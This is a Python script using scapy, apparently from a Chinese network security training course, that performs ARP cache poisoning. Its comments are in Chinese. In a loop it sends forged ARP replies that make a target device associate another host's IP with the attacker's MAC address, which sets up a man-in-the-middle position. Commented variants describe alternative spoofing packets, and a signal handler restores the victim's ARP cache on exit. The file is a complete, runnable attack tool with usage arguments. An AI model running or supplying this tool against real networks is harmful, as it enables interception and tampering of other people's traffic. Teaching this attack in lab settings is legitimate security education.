#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *
#from GET_IP import get_ip_address #导入获取本机IP地址方法
from GET_IP_IFCONFIG import get_ip_address_ifconfig #导入获取本机IP地址方法
from GET_MAC import get_mac_address #导入获取本机MAC地址方法
from ARP_def import get_arp #导入之前创建的ARP请求脚本
import time
import signal

def arp_spoof(ip_1, ip_2, ifname = 'eno33554944'):
	global localip,localmac,ip_1_mac,ip_2_mac,g_ip_1,g_ip_2,g_ifname #申明全局变量
	g_ip_1 = ip_1 #为全局变量赋值，g_ip_1为被毒化ARP设备的IP地址
	g_ip_2 = ip_2 #为全局变量赋值，g_ip_2为本机伪装设备的IP地址
	g_ifname = ifname #为全局变量赋值，攻击使用的接口名字
	#localip = get_ip_address(ifname)
	#获取本机IP地址，并且赋值到全局变量localip
	localip = get_ip_address_ifconfig(ifname)['ip_address']
	#获取本机MAC地址，并且赋值到全局变量localmac
	localmac = get_mac_address(ifname)
	#获取ip_1的真实MAC地址
	ip_1_mac = get_arp(ip_1)
	#获取ip_2的真实MAC地址
	ip_2_mac = get_arp(ip_2)
	#引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
	signal.signal(signal.SIGINT,sigint_handler)
	while True:#一直攻击，直到ctl+c出现！！！
		#op=2,响应ARP
		sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
		#op=1,请求ARP
		#sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
		#以太网头部的src MAC地址与ARP数据部分的hwsrc MAC不匹配攻击效果相同
		#sendp(Ether(src=ip_1_mac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
		#如果采用dst为二层广播，会造成被伪装设备告警地址重叠，并且欺骗效果不稳定，容易抖动！
		print("发送ARP欺骗数据包！欺骗" + ip_1 + '本地MAC地址为' + ip_2 + '的MAC地址！！！')
		time.sleep(1)

def sigint_handler(signum,frame): #定义处理方法
	global localip,localmac,ip_1_mac,ip_2_mac,g_ip_1,g_ip_2,g_ifname#引入全局变量
	print("\n执行恢复操作！！！")
	#发送ARP数据包，恢复被毒化设备的ARP缓存
	sendp(Ether(src=ip_2_mac, dst=ip_1_mac)/ARP(op=2, hwsrc=ip_2_mac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
	print("已经恢复 " + g_ip_1 + " ARP缓存")
	#退出程序，跳出while True
	sys.exit()

if __name__ == "__main__":
	import sys
	if len(sys.argv) > 2:#./ARP_poison.py 202.100.1.1 202.100.1.2 xxxxxxx
		IPADDR_1 = sys.argv[1]#第一个参数为被毒化设备
		IPADDR_2 = sys.argv[2]#第二个参数为本机伪装的设备
		if len(sys.argv) > 3:#./ARP_poison.py 202.100.1.1 202.100.1.2 eno33554944 xxxxx
			IPADDR_1 = sys.argv[1]#第一个参数为被毒化设备
			IPADDR_2 = sys.argv[2]#第二个参数为本机伪装的设备
			INTERFACE = sys.argv[3]#第三个参数为攻击接口的名字
	else:
		print("参数错误")

	if len(sys.argv) > 3:
		arp_spoof(IPADDR_1, IPADDR_2, INTERFACE)
	else:
		arp_spoof(IPADDR_1, IPADDR_2)